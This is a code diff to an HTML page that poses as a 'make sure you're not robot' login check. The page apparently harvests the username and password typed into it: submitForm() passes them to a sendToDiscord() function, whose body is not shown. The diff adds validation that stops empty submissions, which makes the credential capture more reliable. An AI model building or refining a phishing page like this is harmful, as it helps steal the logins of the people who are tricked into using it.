@@ -81,18 +81,38 @@
       font-weight: bold;
       text-decoration: none;
     }
+    .error-message {
+      color: #ff4444;
+      font-size: 12px;
+      margin-bottom: 10px;
+      display: none;
+    }
   </style>
 </head>
 <body>
   <div class="login-box">
     <h2>Login to make sure you're not robot</h2>
+    <div id="error-message" class="error-message">Please fill in both username and password</div>
     <input type="text" id="username" placeholder="Username">
     <input type="password" id="password" placeholder="Password">
     <button class="login-btn" onclick="submitForm()">Log In</button>
-    </div>
+  </div>
 
   <script>
     function submitForm() {
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+      const errorMessage = document.getElementById("error-message");
+
+      // Reset error message
+      errorMessage.style.display = "none";
+
+      // Validate form
+      if (!username || !password) {
+        errorMessage.style.display = "block";
+        return false;
+      }
+
       sendToDiscord();
 
       setTimeout(function() {
